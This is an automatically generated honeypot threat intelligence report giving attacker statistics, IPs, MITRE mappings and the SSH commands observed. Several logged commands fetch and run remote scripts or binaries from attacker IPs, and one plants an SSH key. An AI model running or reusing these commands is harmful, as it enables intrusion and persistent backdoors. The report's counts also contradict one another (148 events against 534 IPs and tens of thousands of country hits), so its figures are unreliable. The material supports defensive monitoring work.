# Threat Intelligence Report

**Generated**: 2026-04-20 03:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **148 events** from **534 unique source IPs** across **33 countries** and **47 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 148 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 534 |
| Atomic Attack Patterns | 159 |
| MITRE ATT&CK Techniques | 5 |
| Generated Sigma Rules | 3 |
| Generated YARA Rules | 2 |
| Generated Suricata Rules | 2 |
| Blocked IPs (Firewall) | 505 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 146 |
| T1105 (Ingress Tool Transfer) | | 4 |
| T1059.004 (Unix Shell) | | 2 |
| T1552.004 (Private Keys) | | 1 |
| T1005 (Data from Local System) | | 1 |

### Tactics Distribution

- **discovery**: 146 events ████████████████████████████████████████
- **command_and_control**: 4 events ██
- **execution**: 2 events █
- **credential_access**: 1 events 
- **collection**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 25,642 |
| France | 6,538 |
| Mexico | 4,566 |
| Germany | 1,328 |
| Bulgaria | 1,116 |
| Netherlands | 789 |
| United Kingdom | 413 |
| China | 293 |
| Singapore | 254 |
| Hong Kong | 237 |
| Pakistan | 233 |
| South Korea | 129 |
| Japan | 115 |
| Portugal | 96 |
| Israel | 87 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 23,142 |
| Sierra Madre Internet SA de CV | 4,408 |
| Modat B.V. | 4,050 |
| OVH SAS | 2,436 |
| ColocaTel Inc. | 1,077 |
| Tube-Hosting | 740 |
| Google LLC | 686 |
| Hydra Communications Ltd | 613 |
| Alibaba US Technology Co., Ltd. | 468 |
| Censys, Inc. | 437 |
| Amazon.com, Inc. | 433 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 416 |
| Vpsvault.host Ltd | 288 |
| NewVM B.V. | 285 |
| DigitalOcean, LLC | 235 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `104.243.43.7` | 4,511 | Attacker |
| `104.243.32.235` | 4,493 | Attacker |
| `177.125.137.18` | 4,408 | Attacker |
| `104.243.35.94` | 3,602 | Attacker |
| `51.68.207.118` | 2,432 | Attacker |
| `104.243.35.92` | 2,193 | Attacker |
| `206.221.176.60` | 1,814 | Attacker |
| `185.150.191.165` | 1,802 | Attacker |
| `85.11.167.11` | 1,067 | Attacker |
| `104.243.34.165` | 946 | Attacker |
| `104.243.35.120` | 937 | Attacker |
| `104.243.32.126` | 928 | Attacker |
| `104.243.35.104` | 904 | Attacker |
| `104.243.43.19` | 889 | Attacker |
| `185.91.127.85` | 738 | Attacker |
| `85.217.140.16` | 683 | Attacker |
| `85.217.140.11` | 285 | Attacker |
| `85.217.140.37` | 273 | Attacker |
| `85.217.140.41` | 258 | Attacker |
| `85.217.140.33` | 255 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 534 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [113x] `uname -a`
- [33x] `/bin/./uname -s -v -n -r -m`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`
- [1x] `cd /usr`
- [1x] `curl -O 61.184.10.103/gg`
- [1x] `chmod 0755 gg`
- [1x] `rm -rf gg`
- [1x] `curl -O 61.184.10.103/syss`
- [1x] `chmod 0755 syss`
- [1x] `./syss`
- [1x] `echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAmFBsJB43Hg7IM/dnZVUYAOI68/xIJvO2sebbI2hQq9jcbloVpF3rY6oqny`
- [1x] `netstat -tulpn`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 3 | `sigma/*.yml` |
| YARA (Payload) | 2 | `yara/*.yar` |
| Suricata (IDS/IPS) | 2 | `suricata/honeypot.rules` |
| Firewall (iptables) | 505 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*